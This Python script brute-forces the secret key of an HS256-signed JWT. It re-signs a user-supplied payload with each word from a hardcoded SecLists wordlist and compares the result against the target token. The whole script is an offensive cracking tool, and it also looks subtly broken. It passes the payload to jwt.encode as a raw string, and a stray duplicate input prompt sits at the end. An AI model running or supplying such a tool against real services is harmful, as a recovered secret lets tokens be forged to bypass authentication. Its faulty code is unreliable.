import jwt 
from pathlib import Path


hash = input("\033[1m Enter jwt token hash to crack : \033[0m")
payload = input("\033[1m Enter jwt payload  : \033[0m")
file_path = Path('C:/Users/net/Desktop/SecLists/google-10000-english/google-10000-english-usa.txt')

flag = False
count = 0
if not file_path.is_file():
    print(f"File not found : {file_path}")
else : 
    try:
        content = file_path.read_text()
        passwords = content.splitlines()
        for password in passwords:
            count += 1
            newHash =  jwt.encode(payload, password, algorithm="HS256")
            if newHash == hash:
               print("\033[91m\033[1m Secret key found  \033[0m : ", password)
               flag = True
               break
        if not flag:
              print(f"\033[91m\033[1m key wasnt found, try again with another wordlist, tried {count} combinations \033[0m")
    except Exception as e:
        print(f"An error occured: {e}")



hash = input("\033[1m Enter jwt token hash to crack : \033[0m")


    